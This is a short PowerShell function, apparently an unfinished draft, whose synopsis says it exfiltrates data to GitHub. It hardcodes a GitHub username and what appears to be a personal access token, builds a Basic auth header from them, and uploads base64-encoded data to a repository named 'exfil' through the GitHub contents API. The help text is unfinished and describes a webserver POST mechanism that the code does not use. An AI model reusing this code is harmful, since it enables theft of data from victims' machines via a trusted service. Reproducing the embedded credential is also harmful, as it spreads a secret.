function Invoke-Script
{

<#
.SYNOPSIS
Use this script to exfiltrate data to github

.DESCRIPTION


.PARAMETER <FILL>
The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.


.EXAMPLE
Can I provide an example?

#>

# This is the GitHub username and Personal Access Token 
$Token = 'nnh100:eb1d2888bed6b7c01fef32ea0ce8fe5b13e4dc39'

# Convert this to base64
$Base64Token = [System.Convert]::ToBase64String([char[]]$Token);
$Headers = @{
    Authorization = 'Basic {0}' -f $Base64Token;
};

$data = "this is a test"

$Body = @{
    path = 'testfile'
    content = [System.Convert]::ToBase64String([char[]]$data);
    encoding = 'base64';
    message = "test commit";
} | ConvertTo-Json;

$content = Invoke-RestMethod -Headers $Headers -Uri https://api.github.com/repos/nnh100/exfil/contents/testfolder/testfile -Body $Body -Method Put




}
